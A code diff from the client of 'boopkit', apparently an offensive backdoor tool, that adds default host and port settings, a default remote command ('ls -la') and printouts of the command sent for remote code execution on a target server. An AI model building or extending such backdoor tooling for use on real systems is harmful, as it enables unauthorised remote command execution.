@@ -88,7 +88,7 @@ void usage() {
   printf("-lport             Local  (src) port:    3535\n");
   printf("-rhost             Remote (dst) address: 127.0.0.1.\n");
   printf("-rport             Remote (dst) port:    22\n");
-  printf("-x, execute        Command to execute on the remote server.\n");
+  printf("-x, execute        Command to execute on the remote server: ls -la\n");
   printf("-h, help           Display help and usage for boopkit.\n");
   printf("\n");
   exit(0);
@@ -108,6 +108,12 @@ struct config {
 
 // clisetup will initialize the config struct for the program
 void clisetup(int argc, char **argv) {
+  // Default values
+  strncpy(cfg.lhost, "127.0.0.1", INET_ADDRSTRLEN);
+  strncpy(cfg.lport, "3535", MAX_PORT_STR);
+  strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
+  strncpy(cfg.rport, "22", MAX_PORT_STR);
+  strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
   for (int i = 0; i < argc; i++) {
     if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1){
       strncpy(cfg.lport, argv[i + 1], MAX_PORT_STR);
@@ -164,6 +170,8 @@ int main(int argc, char **argv) {
   printf("RPORT    [%s]\n", cfg.rport);
   printf("LHOST    [%s]\n", cfg.lhost);
   printf("LPORT    [%s]\n", cfg.lport);
+  printf("RCE EXEC [%s]\n", cfg.rce);
+
 
   // [Destination]
   // Configure daddr fields sin_port, sin_addr, sin_family
@@ -311,5 +319,6 @@ int main(int argc, char **argv) {
   if (errno != 0) {
     printf(" Error serving RCE!\n");
   }
+  printf("EXEC  -> [%s]\n", cfg.rce);
   return 0;
 }
